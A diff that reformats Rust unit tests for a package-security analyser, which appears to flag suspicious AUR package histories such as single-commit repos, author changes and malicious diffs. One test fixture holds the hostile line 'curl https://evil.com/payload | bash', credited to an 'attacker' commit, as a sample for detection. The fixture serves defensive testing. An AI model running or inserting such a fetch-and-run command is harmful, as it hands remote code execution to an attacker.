@@ -133,7 +133,10 @@ mod tests {
 
     #[test]
     fn single_commit() {
-        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
+        let ts = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
         let ctx = PackageContext {
             name: "test".into(),
             metadata: None,
@@ -146,13 +149,20 @@ mod tests {
             github_not_found: false,
             aur_comments: vec![],
         };
-        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
+        let ids: Vec<String> = GitHistoryAnalysis
+            .analyze(&ctx)
+            .iter()
+            .map(|s| s.id.clone())
+            .collect();
         assert!(has(&ids, "T-SINGLE-COMMIT"));
     }
 
     #[test]
     fn malicious_diff() {
-        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
+        let ts = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
         let ctx = PackageContext {
             name: "test".into(),
             metadata: None,
@@ -160,7 +170,11 @@ mod tests {
             install_script_content: None,
             prior_pkgbuild_content: Some("install -Dm755 tool $pkgdir/usr/bin/tool".into()),
             git_log: vec![
-                make_commit("attacker", ts - 3600, Some("+    curl https://evil.com/payload | bash")),
+                make_commit(
+                    "attacker",
+                    ts - 3600,
+                    Some("+    curl https://evil.com/payload | bash"),
+                ),
                 make_commit("original", ts - 86400 * 30, None),
             ],
             maintainer_packages: vec![],
@@ -168,13 +182,20 @@ mod tests {
             github_not_found: false,
             aur_comments: vec![],
         };
-        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
+        let ids: Vec<String> = GitHistoryAnalysis
+            .analyze(&ctx)
+            .iter()
+            .map(|s| s.id.clone())
+            .collect();
         assert!(has(&ids, "T-MALICIOUS-DIFF"));
     }
 
     #[test]
     fn author_change() {
-        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
+        let ts = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
         let ctx = PackageContext {
             name: "test".into(),
             metadata: None,
@@ -190,13 +211,20 @@ mod tests {
             github_not_found: false,
             aur_comments: vec![],
         };
-        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
+        let ids: Vec<String> = GitHistoryAnalysis
+            .analyze(&ctx)
+            .iter()
+            .map(|s| s.id.clone())
+            .collect();
         assert!(has(&ids, "T-AUTHOR-CHANGE"));
     }
 
     #[test]
     fn no_diff_introduced_when_prior_has_net() {
-        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
+        let ts = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
         let ctx = PackageContext {
             name: "test".into(),
             metadata: None,
@@ -204,7 +232,11 @@ mod tests {
             install_script_content: None,
             prior_pkgbuild_content: Some("curl https://example.com/source.tar.gz".into()),
             git_log: vec![
-                make_commit("user", ts - 3600, Some("+    curl https://example.com/v2.tar.gz")),
+                make_commit(
+                    "user",
+                    ts - 3600,
+                    Some("+    curl https://example.com/v2.tar.gz"),
+                ),
                 make_commit("user", ts - 86400 * 30, None),
             ],
             maintainer_packages: vec![],
@@ -212,7 +244,14 @@ mod tests {
             github_not_found: false,
             aur_comments: vec![],
         };
-        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
-        assert!(!has(&ids, "T-MALICIOUS-DIFF"), "Should not flag when prior PKGBUILD already had network code");
+        let ids: Vec<String> = GitHistoryAnalysis
+            .analyze(&ctx)
+            .iter()
+            .map(|s| s.id.clone())
+            .collect();
+        assert!(
+            !has(&ids, "T-MALICIOUS-DIFF"),
+            "Should not flag when prior PKGBUILD already had network code"
+        );
     }
 }
